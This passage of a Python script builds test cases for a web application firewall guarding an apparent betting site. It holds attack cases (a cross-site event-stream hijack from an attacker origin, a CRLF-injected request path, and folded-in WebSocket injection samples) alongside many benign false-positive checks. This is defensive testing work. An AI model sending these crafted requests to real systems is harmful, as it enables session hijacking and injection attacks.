        "allow", severity="low", source="seed", tags=["fp-check", "sse"])
    # cross-site SSE hijack
    for org in [ORIGIN_EVIL, "https://novabet.attacker.evil.com"]:
        add("sse", f"SSE cross-site hijack ({org})",
            f"EventSource opened from foreign origin {org} to siphon notifications",
            {"method": "GET", "path": "/api/notifications/stream", "auth": "session",
             "headers": browser_headers({"Accept": "text/event-stream", "Origin": org,
                                         "Referer": "https://attacker.evil.com/exploit.html"})},
            "block", severity="high", source="seed", tags=["sse-hijack"], rule=["websocket", "cors"])
    # SSE response splitting / CRLF
    add("sse", "SSE response splitting",
        "CRLF in SSE request target to pollute the event stream",
        {"method": "GET", "path": "/api/notifications/stream%0aX-Injected:evil", "auth": "session",
         "headers": browser_headers({"Accept": "text/event-stream"})},
        "block", severity="medium", source="seed", tags=["sse-crlf"], rule=["protocol"])
gen_sse_crafted()

# ----- fold in teammate WS dataset (sampled) -----
def fold_ws_dataset(per_type=22):
    if not os.path.exists(WS_DATASET):
        print("  (teammate WS dataset not found; skipping fold-in)"); return
    data = json.load(open(WS_DATASET))
    by_type = {}
    for s in data["samples"]:
        by_type.setdefault(s["attack_type"], []).append(s)
    for atype, samples in by_type.items():
        random.shuffle(samples)
        chosen = samples[:per_type]
        for s in chosen:
            rt = s["record_type"]
            sev = s.get("severity", "high")
            # map dataset record -> our case
            if rt == "handshake_request":
                hs = dict(s["handshake"]["headers"])
                hs["Host"] = HOST  # retarget to local WAF
                cls = "websocket"
                add(cls, f"[ds] {atype}", s.get("note", atype),
                    {"method": "GET", "path": s["handshake"]["path"], "auth": "none", "headers": hs},
                    "block", severity=sev, source="teammate-ws-dataset",
                    tags=["ws-handshake", atype], rule=["websocket"],
                    ws={"handshake_path": s["handshake"]["path"], "handshake_only": True,
                        "handshake_headers": hs, "frames": []})
            elif rt == "ws_message":
                hs = dict(s["handshake"]["headers"]); hs["Host"] = HOST
                msg = s.get("message", "")
                add("websocket", f"[ds] {atype}", atype + " (frame payload injection)",
                    {"method": "GET", "path": s["handshake"]["path"], "auth": "none", "headers": hs},
                    "block", severity=sev, source="teammate-ws-dataset",
                    tags=["ws-frame", atype], rule=["websocket", "sqli", "xss"],
                    ws={"handshake_path": s["handshake"]["path"], "handshake_only": False,
                        "handshake_headers": hs,
                        "frames": [{"opcode": s.get("frame_type", "text"),
                                    "payload_b64": b64u(msg if isinstance(msg, str) else json.dumps(msg))}]})
            elif rt == "sse_request":
                hs = dict(s["request"]["headers"]); hs["Host"] = HOST
                add("sse", f"[ds] {atype}", atype,
                    {"method": s["request"]["method"], "path": s["request"]["path"],
                     "auth": "none", "headers": hs}, "block", severity=sev,
                    source="teammate-ws-dataset", tags=["sse", atype], rule=["websocket", "cors"])
            elif rt == "dos_pattern":
                # cannot send a single request; informational case (execute:false)
                cls = "rate-limit"
                add(cls, f"[ds] {atype} (pattern)",
                    f"{atype}: {json.dumps(s.get('pattern', {}))[:120]}",
                    {"method": "GET", "path": s.get("ws_endpoint", "/ws/live").split(HOST)[-1] or "/ws/live",
                     "auth": "none", "headers": browser_headers(), "execute": False},
                    "challenge", severity=sev, source="teammate-ws-dataset",
                    tags=["dos-pattern", atype], rule=["rate_limit"])
            elif rt == "sse_message":
                # server->client forged event; not a client request -> informational
                add("sse", f"[ds] {atype} (server frame)",
                    "Forged server-sent event (response-side injection; informational)",
                    {"method": "GET", "path": "/api/notifications/stream", "auth": "session",
                     "headers": browser_headers({"Accept": "text/event-stream"}), "execute": False},
                    "block", severity=sev, source="teammate-ws-dataset",
                    tags=["sse-response-injection", atype], rule=["websocket"])
fold_ws_dataset()

# ================================================================ Benign baseline
def gen_benign():
    users = [("alice", "P@ssw0rd1", "123456"), ("bob", "S3cureP@ss", "654321"),
             ("charlie", "Ch@rlie99", "111222")]
    # auth flow
    for (u, p, o) in users:
        add("benign-baseline", "Login (valid creds)",
            f"Legit /login for {u}",
            {"method": "POST", "path": "/login", "auth": "none",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"username": u, "password": p})}, "allow",
            severity="low", source="seed", tags=["fp-check", "auth"])
        add("benign-baseline", "OTP verify",
            f"Legit /otp for {u}",
            {"method": "POST", "path": "/otp", "auth": "none",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"login_token": "valid-token", "otp_code": o})}, "allow",
            severity="low", source="seed", tags=["fp-check", "auth"])
    # authenticated reads
    for page in [1, 2, 3]:
        for limit in [20, 50, 100]:
            add("benign-baseline", "List transactions",
                f"Paginated transaction history page={page} limit={limit}",
                {"method": "GET", "path": f"/api/transactions?page={page}&limit={limit}",
                 "auth": "session", "headers": browser_headers()}, "allow",
                severity="low", source="seed", tags=["fp-check"])
    for ep in ["/api/profile", "/user/settings", "/game/list", "/health", "/",
               "/about", "/sitemap.xml", "/api/public/stats", "/admin/dashboard"]:
        add("benign-baseline", f"GET {ep}",
            f"Legit read of {ep}",
            {"method": "GET", "path": ep, "auth": "session" if ep.startswith(("/api/profile", "/user", "/admin")) else "none",
             "headers": browser_headers()}, "allow", severity="low", source="seed", tags=["fp-check"])
    # game catalogue browsing (ids 1..5)
    for gid in range(1, 6):
        add("benign-baseline", f"GET /game/{gid}",
            f"Legit game-detail read for game {gid}",
            {"method": "GET", "path": f"/game/{gid}", "auth": "none",
             "headers": browser_headers()}, "allow", severity="low",
            source="seed", tags=["fp-check"])
    # more paginated transaction reads (realistic deep paging)
    for page in range(4, 12):
        add("benign-baseline", "List transactions (deep page)",
            f"Legit transaction history page={page}",
            {"method": "GET", "path": f"/api/transactions?page={page}&limit=20",
             "auth": "session", "headers": browser_headers()}, "allow",
            severity="low", source="seed", tags=["fp-check"])
    # game detail with realistic names (incl. apostrophes — SQLi FP traps)
    for nm in ["Alice", "O'Brien", "Jean-Luc", "Anaïs", "李雷", "Smith & Co", "5 < 10 fan", "user_42"]:
        add("benign-baseline", "Game detail w/ player name (FP trap)",
            f"Personalized welcome with tricky-but-legit name {nm!r}",
            {"method": "GET", "path": "/game/1?name=" + U.quote(nm), "auth": "none",
             "headers": browser_headers()}, "allow", severity="low", source="seed",
            tags=["fp-check", "apostrophe"])
    # writes
    for amt, cur in [(500.0, "USD"), (10.5, "EUR"), (1000000, "USD"), (0.01, "GBP")]:
        add("benign-baseline", "Deposit",
            f"Legit deposit {amt} {cur}",
            {"method": "POST", "path": "/deposit", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"amount": amt, "currency": cur})}, "allow",
            severity="low", source="seed", tags=["fp-check"])
    for amt, acct in [(100.0, "1234567890"), (50.25, "9876543210")]:
        add("benign-baseline", "Withdrawal",
            f"Legit withdrawal {amt} to {acct}",
            {"method": "POST", "path": "/withdrawal", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"amount": amt, "bank_account": acct})}, "allow",
            severity="low", source="seed", tags=["fp-check"])
    for bet in [50.0, 1.0, 250.5]:
        add("benign-baseline", "Play game",
            f"Legit bet {bet} on game 1",
            {"method": "POST", "path": "/game/1/play", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"bet": bet})}, "allow", severity="low",
            source="seed", tags=["fp-check"])
    # profile / settings updates with legit content
    for em, dn in [("alice@example.com", "Alice W."), ("bob+news@mail.co", "Bob (VIP)"),
                   ("c.h@sub.domain.io", "Charlie 李")]:
        add("benign-baseline", "Update profile",
            f"Legit profile update {em}",
            {"method": "PUT", "path": "/api/profile", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"email": em, "display_name": dn})}, "allow",
            severity="low", source="seed", tags=["fp-check"])
    add("benign-baseline", "Update settings",
        "Legit settings update (withdrawal limit + notifications)",
        {"method": "PUT", "path": "/user/settings", "auth": "session",
         "headers": browser_headers({"Content-Type": "application/json"}),
         "body": json.dumps({"preferences": {"withdrawal_limit": 5000, "notifications": True}})},
        "allow", severity="low", source="seed", tags=["fp-check"])
    # feedback with words that look suspicious but are legit prose (FP traps)
    for fb in ["Great platform, love the games!",
               "I'd like to select a different table and drop my old bet, please.",
               "Why is 5 < 10 always true? Anyway, nice site.",
               "Can you add a UNION of poker & blackjack rooms?",
               "My password reset link & email didn't arrive.",
               "Comment with an apostrophe: it's working O'Brien said."]:
        add("benign-baseline", "Feedback (FP trap prose)",
            "Legit feedback containing SQL/HTML-looking words in normal prose",
            {"method": "POST", "path": "/api/feedback", "auth": "none",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"comment": fb})}, "allow", severity="low",
            source="seed", tags=["fp-check", "prose-trap"])
    # reward claim, report export
    add("benign-baseline", "Claim reward",
        "Legit one-time signup reward claim",
        {"method": "POST", "path": "/api/rewards/claim", "auth": "session",
         "headers": browser_headers()}, "allow", severity="low", source="seed", tags=["fp-check"])
    for fmt in ["pdf", "csv", "xlsx"]:
        add("benign-baseline", "Export bet report",
            f"Legit bet-history export as {fmt}",
            {"method": "POST", "path": "/api/bet-reports/export", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"format": fmt})}, "allow", severity="low",
            source="seed", tags=["fp-check"])
    # static assets
    for a in ["/static/js/app.js", "/static/css/style.css", "/assets/logo.png",
              "/public/terms.html", "/public/faq.html", "/favicon.ico"]:
        add("benign-baseline", f"Static {a}", f"Legit static fetch {a}",
            {"method": "GET", "path": a, "auth": "none", "headers": browser_headers()},
            "allow", severity="low", source="seed", tags=["fp-check"])
    # CORS preflight
    add("benign-baseline", "CORS preflight stats",
        "Legit OPTIONS preflight for /api/public/stats partner embed",
        {"method": "OPTIONS", "path": "/api/public/stats", "auth": "none",
         "headers": {"Origin": "https://partner.example.com",
                     "Access-Control-Request-Method": "GET"}}, "allow",
        severity="low", source="seed", tags=["fp-check", "cors"])
    # multipart KYC (benign small PNG)
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    parts = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"document_type\"\r\n\r\nid_card\r\n"
             f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"id.png\"\r\n"
             f"Content-Type: image/png\r\n\r\n").encode() + png + f"\r\n--{boundary}--\r\n".encode()
    add("benign-baseline", "KYC document upload (multipart)",
        "Legit multipart/form-data ID upload — WAF must not strip the envelope",
        {"method": "POST", "path": "/api/kyc/document", "auth": "session",
         "headers": {"User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={boundary}"},
         "body": base64.b64encode(parts).decode(), "body_b64": True}, "allow",
        severity="low", source="seed", tags=["fp-check", "multipart"])
    # gzip analytics batch (benign)
    payload = json.dumps({"events": [{"name": "page_view", "ts": 1789000000000, "props": {"path": "/game/1"}},
                                     {"name": "click", "ts": 1789000001000, "props": {"id": "bet"}}]}).encode()
    buf = io.BytesIO();
    with gzip.GzipFile(fileobj=buf, mode="wb") as g: g.write(payload)
    add("benign-baseline", "Analytics batch (gzip)",
        "Legit gzip-compressed analytics batch — WAF must decompress & allow",
        {"method": "POST", "path": "/api/analytics/events", "auth": "session",
         "headers": {"User-Agent": UA, "Content-Type": "application/json",
                     "Content-Encoding": "gzip"},
         "body": base64.b64encode(buf.getvalue()).decode(), "body_b64": True}, "allow",
        severity="low", source="seed", tags=["fp-check", "gzip"])
    # more legit deposits / withdrawals / bets (volume for FP confidence)
    for amt in [25.0, 75.5, 200.0, 333.33, 999.99, 1500.0, 4200.0]:
        add("benign-baseline", "Deposit (varied amount)",
            f"Legit deposit {amt} USD",
            {"method": "POST", "path": "/deposit", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"amount": amt, "currency": "USD"})}, "allow",
            severity="low", source="seed", tags=["fp-check"])
    for bet, gid in [(5.0, 2), (20.0, 3), (100.0, 4), (75.0, 5), (10.0, 1)]:
        add("benign-baseline", "Play game (varied)",
            f"Legit bet {bet} on game {gid}",
            {"method": "POST", "path": f"/game/{gid}/play", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"bet": bet})}, "allow", severity="low",
            source="seed", tags=["fp-check"])
    # more realistic display names / emails (incl. internationalized + symbols)
    for em, dn in [("user.name+tag@sub.example.co.uk", "María José"),
                   ("a_b-c@example.io", "Mr. O'Connor"), ("test123@mail.org", "山田太郎"),
                   ("vip@novabet.com", "King of Spades ♠"), ("q@e.co", "D'Angelo")]:
        add("benign-baseline", "Update profile (i18n/symbols)",
            f"Legit profile update {em} / {dn}",
            {"method": "PUT", "path": "/api/profile", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"email": em, "display_name": dn})}, "allow",
            severity="low", source="seed", tags=["fp-check", "i18n"])
    # benign analytics batches (varied shapes the API accepts)
    for shape in [
        {"events": [{"name": "page_view", "ts": 1789000000000, "props": {"path": "/"}}]},
        [{"name": "scroll", "ts": 1789000002000, "props": {"depth": 80}}],
        {"name": "game_open", "ts": 1789000003000, "props": {"game": 3}},
    ]:
        raw = json.dumps(shape).encode()
        buf2 = io.BytesIO()
        with gzip.GzipFile(fileobj=buf2, mode="wb") as g2: g2.write(raw)
        add("benign-baseline", "Analytics batch (varied shape, gzip)",
            "Legit analytics batch in an accepted shape, gzip-encoded",
            {"method": "POST", "path": "/api/analytics/events", "auth": "session",
             "headers": {"User-Agent": UA, "Content-Type": "application/json",
                         "Content-Encoding": "gzip"},
             "body": base64.b64encode(buf2.getvalue()).decode(), "body_b64": True},
            "allow", severity="low", source="seed", tags=["fp-check", "gzip"])
    # benign public stats GET (CORS simple request from partner) + HEAD health
    add("benign-baseline", "Public stats w/ Origin (simple CORS GET)",
        "Legit cross-origin simple GET for marketing widget",
        {"method": "GET", "path": "/api/public/stats", "auth": "none",
         "headers": browser_headers({"Origin": "https://partner.example.com"})},
        "allow", severity="low", source="seed", tags=["fp-check", "cors"])
    add("benign-baseline", "HEAD health probe",
        "Legit uptime monitor HEAD /health",
        {"method": "HEAD", "path": "/health", "auth": "none",
         "headers": {"User-Agent": "UptimeRobot/2.0"}}, "allow",
        severity="low", source="seed", tags=["fp-check", "monitor"])
gen_benign()

# ================================================================ write out
total = 0
manifest = {}
for cls, cases in sorted(bucket.items()):
    d = os.path.join(CASES, cls)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "cases.json"), "w") as f:
        json.dump(cases, f, indent=2)
    manifest[cls] = len(cases); total += len(cases)
    print(f"  {cls:22} {len(cases):4} cases")
# benign / attack split
benign = sum(1 for cs in bucket.values() for c in cs if c["expect"]["verdict"] == "allow")
attack = total - benign
manifest["_total"] = total; manifest["_benign"] = benign; manifest["_attack"] = attack
with open(os.path.join(CASES, "manifest.json"), "w") as f:
    json.dump(manifest, f, indent=2)
print(f"\nTOTAL {total} cases  (benign/allow={benign}, attack={attack})  across {len(bucket)} classes")
